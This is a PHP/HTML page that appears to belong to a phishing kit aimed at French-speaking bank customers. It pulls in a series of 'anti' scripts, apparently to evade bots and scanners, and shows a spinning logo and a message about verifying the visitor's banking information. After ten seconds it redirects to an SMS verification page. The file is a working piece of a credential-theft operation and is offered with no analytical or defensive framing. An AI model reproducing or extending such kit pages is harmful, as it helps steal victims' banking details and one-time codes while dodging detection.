<?php
error_reporting(0);
ob_start();
session_start();

include '../../prevents/anti1.php';

include '../../prevents/anti2.php';

include '../../prevents/anti3.php';

include '../../prevents/anti4.php';

include '../../prevents/anti5.php';

include '../../prevents/anti6.php';

include '../../prevents/anti7.php';

include '../../prevents/anti8.php';

include '../../monsterab/ab.php';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="stylesheet" href="other/style.css">
    <meta http-equiv="Refresh" content="10; url=sms_verification.php" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification de vos informations</title>
</head>
<body>
<center>
<br><br><br><br><br><br><br><br>
    <img src="assets/logo.png" style="height: 120px;" alt="">
    <br>
    <img src="assets/circle.png" class="rotate" alt="">
    <br><br>
    <div width="10px">
    <p>Vous allez bientot etre rediriger sur la page de vérification de vos informations bancaire veuillez patienter !</p>
    </div>
</center>
</body>
</html>
